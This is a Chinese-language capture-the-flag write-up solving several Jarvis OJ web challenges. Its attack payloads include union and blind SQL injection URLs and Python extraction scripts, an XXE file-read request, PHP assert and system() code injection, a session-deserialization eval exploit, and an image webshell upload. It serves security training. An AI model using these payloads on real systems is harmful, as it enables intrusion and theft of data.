联系qq 1055331692 文章部分内容有参考已注明出处

### PORT 51

服务器出问题不能弹出flag 不过思路是

`curl --local-port 51 http://web.jarvisoj.com:32770/` 





### LOCALHOST

<http://web.jarvisoj.com:32774/> 

打开是localhost access only!!

抓包修改 X-forward-for: 127.0.0.1



### Login

F12查看网络包时发现有 hint `select * from 'admin' where password='".md5($pass,true)."'` 

md5()函数有绕过的一个漏洞

看到这里的提交参数被MD5再组合进SQL查询语句，导致常规的注入手段几乎都失效了  

 但是注意到，MD5之后是hex格式，转化到字符串时如果出现`'or'xxxx`的形式，就会导致注入   

这里提供一个抄来的字符串：`ffifdyop`   

`md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c` 

  转成字符串为`'or'6�]��!r,��b`   

从而完成了注入   



### 神盾局的秘密

http://web.jarvisoj.com:32768

大图下面点击右键查看源码

`<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>` 

一个任意文件读取

把 `index.php`  base64编码放入其中得到源码

```php+HTML
<?php 
	require_once('shield.php');
	$x = new Shield();
	isset($_GET['class']) && $g = $_GET['class'];
	if (!empty($g)) {
		$x = unserialize($g);
	}
	echo $x->readfile();
?>
<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>

```

然后把 `shield.php` base64编码读取

```php
<?php
	//flag is in pctf.php
	class Shield {
		public $file;
		function __construct($filename = '') {
			$this -> file = $filename;
		}
		
		function readfile() {
			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
				return @file_get_contents($this->file);
			}
		}
	}
?>

```

分析一波 要求传入 `class` 其内容进行反序列化操作后是一个对象

这个对象要求是 Shield 并且其中的 $file=pctf.php

因此构建代码

```php
<?php
	class Shield {
		public $file;
		function __construct($filename = '') {
			$this -> file = $filename;
		}
	}
	$g = new Shield();
	$g -> file = 'pctf.php';

	echo serialize($g);


?>
```

得到字符串 `O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";} ` 

传进去即可



### IN A Mess

个人觉得是一道很好的题目

右键查看源码

`<!--index.phps-->work harder!harder!harder!` 

访问 index.phps

得到源码

```php
<?php

error_reporting(0);
echo "<!--index.phps-->";

if(!$_GET['id'])
{
	header('Location: index.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'Hahahahahaha';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("flag.txt");
}
else
{
	print "work harder!harder!harder!";
}


?>
```

id可以用==弱类型比较绕过采用 0a

a需要用php://input 伪协议绕过 post data 是 1112 is a nice lab! 

b采用 eregi()对%00截断 且substr不截断 构造 b=%0012345

 满足条件后访问得到

`Come ON!!! {/^HT2mCpcvOLf} ` 

试提交flag但错误 猜测是一个路径

访问得到

`http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1` 

猜测是一个sql注入

发现大部分词被过滤

后网上查看wirte up 发现可以用

`/*1*/ 代替空格 双写 uniunionon等` 绕开过滤

`http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=-1/*1*/uniunionon/*1*/seleselectct/*1*/1,2,database()`   查到数据库test



`http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=-1/*1*/uniunionon/*1*/seleselectct/*1*/1,2,table_name/*1*/frfromom/*1*/information_schema.tables/*1*/where/*1*/table_schema=0x74657374`                                          查到表名 content



`http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=-1/*1*/uniunionon/*1*/seleselectct/*1*/1,2,group_concat(column_name)/*1*/frfromom/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74`       查到字段名  id,context,title 



`http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=-1/*1*/uniunionon/*1*/seleselectct/*1*/1,2,group_concat(id,context,title)/*1*/frfromom/*1*/content`                              查到flag  `1 PCTF{Fin4lly_U_got_i7_C0ngRatulation5} hi666 `





### API调用 

请设法获得目标机器/home/ctf/flag.txt中的flag值。

题目入口：<http://web.jarvisoj.com:9882/> 



打开后右键查看源码 发现了xml 于是猜是一个XXE漏洞

抓包

```
<?xml version="1.0"?>
<!DOCTYPE a[
  	<!ENTITY xxe SYSTEM "file:///home/ctf/flag.txt">
]>
<task><value>&xxe;</value></task>
```

按照正常的格式填好发过去 一开始返回400错误

后来发现需要把 `Content-Type: application/xml` 改一下

直接获取flag： CTF{XxE_15_n0T_S7range_Enough} 



### babyphp

<http://web.jarvisoj.com:32798/> 

点进去发现存在提示 git

于是想到会不会是git源码泄露

打开扫描器一扫发现确实是

于是直接 Githack 下载一波源码

发现了可以代码执行

```php
<?php
if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}
$file = "templates/" . $page . ".php";
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
assert("file_exists('$file')") or die("That file doesn't exist!");
?>
```

在 assert中 我们可以闭合一下引号 构造 payload

`','..')===false and system('cat templates/flag.php');//` 

那么原来的代码就是

```php
assert("strpos('"templates/','..')===false and system('cat templates/flag.php');//.php', '..') === false") or die("Detected hacking attempt!");
```

可以读取到flag

```
61dctf{8e_careful_when_us1ng_ass4rt}
```



当然看到了其他师傅的payload是这样的

```
http://web.jarvisoj.com:32798/?page='.system("tac templates/flag.php").'

http://web.jarvisoj.com:32798/?page=' and die(show_source('templates/flag.php')) or '

http://web.jarvisoj.com:32798/?page=/././')|system('tac templates/flag.php');//
```

 同样很强大



### phpinfo 

是一道很好的题目

题目上来直接给出了源码

```php
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }
    
    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```

这个题是完全没有头绪的直到看到了大佬类似题目的write up

https://www.jb51.net/article/107101.htm 

https://blog.csdn.net/qq_35078631/article/details/77284684

在php.ini中存在三项配置项：

- `session.save_path=""`   --设置session的存储路径

- `session.save_handler="" `--设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)

- `session.auto_start   boolen` --指定会话模块是否在请求开始时启动一个会话,默认为0不启动

- `session.serialize_handler   string `--定义用来序列化/反序列化的处理器名字。默认使用php 

  在上述的配置中，session.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。

  1. php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值
  2. php:存储方式是，键名+竖线+经过serialize()函数序列处理的值
  3. php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值

  在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码`ini_set('session.serialize_handler', '需要设置的引擎');`。



| 处理器                     | 对应的存储格式                                               |
| -------------------------- | ------------------------------------------------------------ |
| php                        | 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值          |
| php_binary                 | 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 |
| php_serialize (php>=5.5.4) | 经过 serialize() 函数反序列处理的数组                        |



举个栗子

我们可以看到php只是比php_serialize序列化多出了一个键名 ＋ 竖线 ，键名可以是空的，那么我们只需要多加一个`|` 就可以完成代码注入，我们做一个小实验，构造两个文件index.php和flag.php，其代码如下

```php
//index.php
<?php 
ini_set('session.serialize_handler', 'php_serialize'); 
session_start(); 
$_SESSION["OowoO"]=$_GET["a"]; 
echo $_SESSION["OowoO"];
?>1234567
```

```php
//flag.php
 <?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }

    function __destruct()
    {
        eval($this->mdzz);
    }
}

?>
```

可以看到index.php中为session的输入，形式为php_serialize，而flag.php中解析的形式为php，那么我们构造请求

```
localhost/index.php?a=|O:5:"OowoO":1:{s:4:"mdzz";s:14:"echo "hacker";";}
```



再去用这个构造精良的session访问flag.php时就会被错误的解析

键名解析为空，而键值解析为了 OowoO 的一个对象 成功执行代码执行

而看我们这个题的源码

发现并没有任何输入的地方 这时候又有

可以利用`Session Upload Progress`进行上传 参考资料如下   <https://secure.php.net/manual/en/session.upload-progress.php> 

我们构造一个文件，内容为

```
<form action="http://web.jarvisoj.com:32784/" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>12345
```

然后用burp截取上传的数据包，然后我们只要修改其中的filename即可完成上传。 
 在本地创建一个.php文件用于生成我们需要的序列化代码

最后一步我们还需要本地生成 序列化代码

```php
<?php
ini_set('session.serialize_handler', 'php_serialize');
class OowoO
{
    public $mdzz='需要设置的代码';
    function __construct()
    {
        // $this->mdzz = 'phpinfo();';
    }

    function __destruct()
    {
        // echo $this->mdzz;
    }
}
$obj = new OowoO();
echo serialize($obj);
?>
```



于是抓包修改filename

```
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:35:\"print_r($_SERVER[\"DOCUMENT_ROOT\"]);\";}
```

```
/opt/lampp/htdocs
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:39:\"print_r(scandir('/opt/lampp/htdocs/'));\";}
```

```
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:73:\"show_source(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\");\";}
```

即可获取flag   学到了不少姿势啊！！！



### Easy Gallery 

题目入口：<http://web.jarvisoj.com:32785/> 

这个题目是一个文件上传

文件上传一般需要考虑两大点

1.绕过过滤成功上传

2.执行上传文件

上传的时候，发现后台不是通过文件后缀来进行判断的，还对文件的MIME进行了判断，那么就必须上传图片一句话木马了。 

`copy 1.jpg/b+2.php/a 3.jpg` 

上传3.jpg的图片木马上去

然后发现 `http://web.jarvisoj.com:32785/index.php?page=submit` 

猜想 ?page= 后的内容是否可以文件包含

尝试访问 `http://web.jarvisoj.com:32785/index.php?page=submit'`

报错 `  **Warning**:  fopen(submit'.php): failed to open stream: No such file or directory in **/opt/lampp/htdocs/index.php** on line **24**  No such file! ` 

那我们就知道了其实是把page的参数加上 .php 进行文件包含

这里我们可用%00截断  后面的.php

那么我们上传图片马 后给我们的图片id试着去访问

`uploads/图片id.jpg%00` 

但是出现 ``You should not do this!`。 ` 

那猜测后台是不是对 <?php    内容   ?> 格式进行了过滤？

尝试采用绕过

```
<script language='php'>
echo "123";
</script>
```

继续上传访问

即可获得flag



### Simple injection

进去先看源码，扫描器扫一下，看一下请求头发现都没有什么信息

然后测试 admin    admin   发现提示密码错误

测试 admin1  admin  提示用户名错误

看了师傅的博客 https://blog.csdn.net/qq_33426111/article/details/79439739

常见的登陆漏洞类型 
 同时验证用户名和密码

```
$sql = select * from users where username=$username and password=$password
$result = mysql_query($sql);
if($result) {
    echo "登陆成功";
} else {
    echo "登陆失败";
}
```

分步验证用户名、密码

```
$sql = "select password from users where username='$username'"
$result = mysql_query($sql);
if($result) {
    $row = mysql_fetch_row($result);
    $query_password = $row[$password];
    #对输入的$password进行变形
    $input_password = modify($passowrd);
    if($input_password == $query_password) {
        echo "登陆成功";
    } else {
        echo "密码错误";
    }

} else {
    echo "用户不存在";
}
```

所以猜测是分布验证用户名

测试 admin'#       admin提示密码错误   表示没有过滤 ‘ #

测试 admin'  and   1=1#     admin提示用户名错误   表示过滤了  =  或者and  或者空格

测试一下发现过滤了空格    随后发现可以用/**/ 来绕过空格的过滤

因此构成了一个sql盲注

直接引用师傅的code了

一、

```
import requests

def get_data():
    result = ""
    url = 'http://web.jarvisoj.com:32787/login.php'
    payload = {
        "username":'xx',
        "password":1,
    }
    username_template = "'/**/or/**/ascii(substr((select/**/password/**/from/**/admin),{0},1))>{1}#"
    chars = '0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'
    for i  in range(1,33):
        for char in chars:
            char_ascii = ord(char)
            username = username_template.format(i,char_ascii)
            payload['username'] = username
            response = requests.post(url,data=payload)
            length = len(response.text)
            # print(length)
            #返回的长度只有1191和1192
            if length>1191:
                print(char)
                result += char
                break
    print(result)

get_data()
```

二、

```
#encoding: utf-8
 #created by noble @ 2017.1.21
import requests
url = "http://web.jarvisoj.com:32787/login.php"
table_name_temp = "admin'/**/and/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),{0},1))>{1}#"
column_name_temp = "admin'/**/and/**/ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=0x61646D696E/**/limit/**/2,1),{0},1))>{1}#"
password_temp = "admin'/**/and/**/ascii(substr((select/**/password/**/from/**/admin/**/limit/**/0,1),{0},1))>{1}#"
result = ""
session = requests.Session()
char = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
for i in range(1, 50):      #设置字符长度为50
       for c in char:
              asc = ord(c)      #获取字符的ascii值
              username = password_temp.format(i, asc)
              data = {'username': username,
              'password': 'admin'
              }
              req = session.post(url=url, data=data, timeout=10)
              status = req.status_code
              length = req.headers['content-length']
              if status == 200:
                     #print length
                     #print req.text
                     if length == "1205":
                            result += c
                            print c
                            break
print result
```

最后得到password的值为334cfb59c9d74849801d5acdcfdaadc3。 
 解md5后得:`eTAloCrEP` 
 登陆后得到flag:`flag:CTF{s1mpl3_1nJ3ction_very_easy!!}` 



